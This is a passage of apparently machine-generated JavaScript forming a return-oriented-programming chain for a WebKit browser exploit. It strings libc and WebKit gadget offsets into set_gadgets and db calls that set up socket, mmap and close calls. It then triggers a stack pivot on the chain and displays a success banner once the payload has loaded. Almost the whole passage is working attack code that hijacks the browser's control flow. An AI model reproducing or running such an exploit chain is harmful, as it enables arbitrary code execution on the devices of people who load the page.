libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5202439, //and rax, rcx
libc_base+792472, //pop rcx
socket_addr,
webkit_base+2997875, //mov [rax], rcx
libc_base+793877 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+201072, //L3187
webkit_base+7438103, //mov [rsi], rax
libc_base+811575 //pop rsp
]);
//L3187:
db([0, 0]); // 0x0
//L2639:
set_gadget(libc_base+793877,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+105267, //pop rdx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+10235455, //pop r9
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+785193, //xor rax, rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+7438103, //mov [rsi], rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+811575, //pop rsp
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5202439, //and rax, rcx
libc_base+792472, //pop rcx
mmap_addr,
webkit_base+2997875, //mov [rax], rcx
libc_base+793877 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+202400, //L3188
webkit_base+7438103, //mov [rsi], rax
libc_base+811575 //pop rsp
]);
//L3188:
db([0, 0]); // 0x0
//L3154:
set_gadget(libc_base+793877,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+105267, //pop rdx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+10235455, //pop r9
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+785193, //xor rax, rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+7438103, //mov [rsi], rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+811575, //pop rsp
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5202439, //and rax, rcx
libc_base+792472, //pop rcx
close_addr,
webkit_base+2997875, //mov [rax], rcx
libc_base+793877 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+203728, //L3189
webkit_base+7438103, //mov [rsi], rax
libc_base+811575 //pop rsp
]);
//L3189:
db([0, 0]); // 0x0
//L2648:
db([5, 0, 0, 0, 0, 0]);
//L2881:
db([5, 0, 0, 0, 0, 0]);
//L2921:
db([5, 0, 0, 0, 0, 0]);
setTimeout(function(){
pivot(ropchain);
},1000);
var main_ret = read_ptr_at(main_ret);
var printf_buf_end = read_ptr_at(ropchain+printf_buf_offset);
var printf_ans = read_mem_as_string(printf_buf, printf_buf_end-printf_buf);
var _ = malloc_nogc.pop();
var _ = malloc_nogc.pop();
var _ = malloc_nogc.pop();
if(main_ret==179|| main_ret==0){
window.msgs.innerHTML="<h1 style='font-size:25px;color:green;text-align:center;'>"+LoadedMSG+"</h1>";
}
